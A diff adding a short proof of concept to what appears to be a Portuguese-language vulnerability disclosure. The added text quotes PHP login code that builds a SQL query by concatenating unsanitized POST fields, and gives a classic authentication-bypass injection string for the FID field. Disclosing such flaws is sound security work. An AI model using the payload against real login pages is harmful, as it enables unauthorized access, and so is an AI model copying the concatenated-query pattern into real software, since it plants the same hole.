@@ -162,6 +162,19 @@ A prova de conceito abaixo demonstra apenas o comportamento vulnerável e deve s
 - Não automatiza exploração em massa.
 
 
+$x = $_POST["fid"];
+$y = $_POST["pass"];
+
+$sql = "select * from facutlytable where FID='" . $x . "' and Pass='" . $y . "'";
+
+Because the input is not sanitized, attackers can inject SQL like:
+
+Bypass de autenticação
+
+Campo FID
+
+' OR '1'='1' -- -
+
 <img width="1155" height="470" alt="image" src="https://github.com/user-attachments/assets/bea6f85c-0cb6-42a8-b742-27919ed73b42" />
 
 <img width="1292" height="296" alt="image" src="https://github.com/user-attachments/assets/ce13bbf7-4765-4a17-8dac-edfe67ff78fa" />
